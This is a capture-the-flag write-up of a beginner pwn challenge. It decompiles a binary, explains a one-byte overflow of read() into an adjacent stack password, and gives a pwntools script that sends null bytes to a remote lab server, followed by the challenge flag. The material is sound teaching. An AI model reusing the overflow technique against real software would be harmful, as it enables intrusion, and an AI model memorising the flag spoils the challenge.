# Writing on the Wall

## Description

> As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?
>
> [Attached file](./challenge)

Tags: _Pwn_ \
Difficulty: _very easy_ \
Points: _300_

## Recognition phase

Just do the usual task for this phase

```
$ file writing_on_the_wall                                                     
writing_on_the_wall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=e1865b228b26ed7b4714423d70d822f6f188e63c, for GNU/Linux 3.2.0, not stripped

```
```
$ checksec writing_on_the_wall
[*] '/home/jovenoven/Downloads/ctf/cyberApocalypse2024_HTB/pwn/writing_on_the_wall/writing_on_the_wall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```
Decompiling the binary using `Ghidra`

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_1e [6];
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0x2073736170743377;
  read(0,local_1e,7);
  iVar1 = strcmp(local_1e,(char *)&local_18);
  if (iVar1 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void open_door(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to open the door! Here is the password for the next one: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

In summary, the `open_door()` function prints the flag, and it will execute if the variables `local_1e` and `local_18` are equal, with `local_18` being set to `w3tpass` and `local_1e` being provided by the user.

## Finding the bug

The password is `w3tpass`. However, the program rejects it because the `read()` function doesn't null-terminate the user input in `local_1e`. Consequently, when `strcmp()` is called, it not only reads our input but also the next variables in the stack until reaching a null byte, and compares it with the password. Additionally, the `read()` function has a one-byte buffer overflow bug because `local_1e` is 6 bytes long, but the `read()` function receives 7 bytes. As a result, the 7th byte overlaps with just the first byte of the variable `local_18`, which is the actual password. You can corroborate it by debugging in `gdb` and reading the stack layout that `Ghidra` provides
```
******************************************
*                FUNCTION                *
******************************************
undefined main()
undefined         AL:1           <RETURN>
undefined8        Stack[-0x10]:8 local_10
undefined8        Stack[-0x18]:8 local_18
undefined1        Stack[-0x1e]:1 local_1e
```

## Exploitation phase

Since we can change the first byte of the actual password, we can null-terminate it right from the beginning to make it an empty password. At the same time, we can provide an empty password as well.

My code is unnecessarily large, but don't judge me; it is the template I always use. Take into account that the "EXPLOIT GOES HERE" section is the part that matters in my template. In summary, we are just sending 7 null bytes to the program. 


```Python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("writing_on_the_wall")

# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
b strcmp
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.56.26", 36542)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

io.sendlineafter(b">> ", p8(0)*7)

#============================================================

# Interact with the process
io.interactive()
```

\
Flag `HTB{3v3ryth1ng_15_r34d4bl3}`
